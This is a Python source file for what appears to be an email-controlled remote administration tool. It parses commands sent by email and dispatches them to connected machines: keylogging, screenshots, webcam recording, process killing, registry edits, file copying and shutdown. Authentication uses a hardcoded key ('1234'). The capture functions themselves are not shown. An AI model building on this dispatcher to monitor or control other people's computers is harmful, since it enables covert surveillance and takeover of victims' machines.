import mail_handler as handler

# a list of dictionary, each of which has the type
# { email_address: IP connected }

def get_corresponding_ip(email_address):
    if email_address in handler.email_ip_dict:
        return handler.email_ip_dict[email_address]
    return None

"""
    AUTH <Key> <IP>: start connection to IP, return ACK
    LIST <Key>: list all connected IPs, return list str
    DISC: disconnect current connection, ACK
    double AUTH, error

    * PROCESS & ABP
        LIST_PROC (Name, PID, threads)
        LIST_APP (Name, ID, threads)
        KILL <ID/PID>, ACK/Err
    
    * CAPTURING
        SCREENSHOT <seconds>, a video
        WEB/REC <seconds>, a video
        KEYLOG <seconds>, a list of actions
    
    * HIGHER PRIVILEGE COMMANDS
        SHUTDOWN/RESTART, ACK, call DISC afterwards
        REGISTRY, DIR:
            LIST <path to folder>, list of "directory/files"
            
        REGISTRY UPDATE <absolute path> <value> <data-type>, ACK
        DIR COPY <src path> <dst path folder>, ACK
"""
def command_parser(message, sender_address):
    print('Command:', message)
    print('Command length: ', len(message))
    msg = message.split(' ')
    print('After split: ', msg)
    '''
    file_in = open('keys.txt', "r")
    key = file_in.readline()
    key = key.strip()
    # print(key)
    '''
    key = '1234'
    # file_in.close()
    
    try:
        if len(msg) > 5: # too many arguments
            raise Exception("Too many arguments")

        if len(msg) == 0:
            raise Exception("No arguments")

        if len(msg) == 5:
             if msg[0] == "REGISTRY":
                if msg[1] == "UPDATE":
                    ip_address = get_corresponding_ip(sender_address)
                    if ip_address is None:
                        raise Exception("No corresponding IP")
                    handler.registry_update(ip_address, msg[2], msg[3], msg[4])
                else:
                    raise Exception("Invalid command")
        
        elif len(msg) == 4:
            if msg[0] == "DIR":
                if msg[1] == "COPY":
                    ip_address = get_corresponding_ip(sender_address)
                    if ip_address is None:
                        raise Exception("No corresponding IP")
                    handler.dir_copy(ip_address, msg[2], msg[3])
                else:
                    raise Exception("Invalid command")

            else:
                raise Exception("Invalid command")
        
        elif len(msg) == 3:
            if msg[0] == "AUTH":
                if msg[1] != key:
                   raise Exception("Invalid key")

                if handler.is_valid_ip(msg[2]) == False:
                    raise Exception("Invalid IP")  

                 # if the code goes here, it will start connection to the IP at msg[2]
                # ip_address = msg[2]
                colon_index = msg[2].find(':')
                ip_address = msg[2][:colon_index]
                port = int(msg[2][colon_index+1:])
                ip_tuple = (ip_address, port)
                handler.authorize(sender_address, ip_tuple)

            elif msg[0] == "REGISTRY":
                if msg[1] == "LIST":
                    ip_address = get_corresponding_ip(sender_address)
                    if ip_address is None:
                        raise Exception("No corresponding IP")
                    handler.registry_list(ip_address, msg[2])
                else:
                    raise Exception("Invalid command")

            elif msg[0] == "DIR":
                if msg[1] == "LIST":
                    ip_address = get_corresponding_ip(sender_address)
                    if ip_address is None:
                        raise Exception("No corresponding IP")
                    handler.dir_list(ip_address, msg[2])
                else:
                    raise Exception("Invalid command")

            else:
                raise Exception("Invalid command")

        elif len(msg) == 2:
            if msg[0] == "LIST":
                if msg[1] != key:
                    raise Exception("Invalid key")

                handler.list_ip(sender_address)
            elif msg[0] == "KILL":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.kill_process(ip_address, msg[1])
            elif msg[0] == "WEB" or msg[0] == "REC":
                if msg[1].isdigit() == False:
                    raise Exception("Invalid number of seconds")
                else:
                    ip_address = get_corresponding_ip(sender_address)
                    if ip_address is None:
                        raise Exception("No corresponding IP")
                    handler.capture_webcam(ip_address, int(msg[1]))
            elif msg[0] == "KEYLOG":
                if msg[1].isdigit() == False:
                    raise Exception("Invalid number of seconds")
                else:
                    ip_address = get_corresponding_ip(sender_address)
                    if ip_address is None:
                        raise Exception("No corresponding IP")
                    handler.keylog(ip_address, int(msg[1]))
            elif msg[0] == "SCREENSHOT":
                if msg[1].isdigit() == False:
                    raise Exception("Invalid number of seconds")
                else:
                    ip_address = get_corresponding_ip(sender_address)
                    if ip_address is None:
                        raise Exception("No corresponding IP")
                    handler.capture_screen(ip_address, int(msg[1]))
            else:
                raise Exception("Invalid command")
        else:
            if msg[0] == "DISC": # disconnect 
                handler.disconnect(sender_address)
            elif msg[0] == "LIST_PROC":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.list_process(ip_address)
            elif msg[0] == "LIST_APP":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.list_application(ip_address)
            elif msg[0] == "KEYLOG":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.keylog(ip_address)
            elif msg[0] == "SCREENSHOT":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.capture_screen(ip_address)
                '''
            elif msg[0] == "MAC":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.mac_address(ip_address)
                '''
            elif msg[0] == "SHUTDOWN":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.shut_down(ip_address)
                handler.disconnect(sender_address)
            elif msg[0] == "LOGOUT":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.logout(ip_address)
                handler.disconnect(sender_address)
            elif msg[0] == "RESTART":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.restart(ip_address)
                handler.disconnect(sender_address)
            elif msg[0] == "WEB" or msg[0] == "REC":
                ip_address = get_corresponding_ip(sender_address)
                if ip_address is None:
                    raise Exception("No corresponding IP")
                handler.capture_webcam(ip_address)
            else:
                raise Exception("Invalid command")
    except Exception as e:
        handler.raise_error_message(e)      